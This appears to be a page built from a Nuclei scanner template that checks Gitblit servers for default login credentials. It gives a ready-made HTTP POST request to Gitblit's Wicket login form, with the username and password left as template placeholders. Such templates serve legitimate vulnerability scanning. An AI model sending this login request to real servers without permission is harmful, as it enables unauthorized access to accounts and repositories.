# Nuclei Template: Gitblit - Default Login
**Template ID:** gitblit-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`gitblit-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Gitblit Default login credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /?wicket:interface=:0:userPanel:loginForm::IFormSubmitListener:: HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

wicket%3AbookmarkablePage=%3Acom.gitblit.wicket.pages.MyDashboardPage&id1_hf_0=&username={{username}}&password={{password}}
```

## References
- https://www.gitblit.com/administration.html
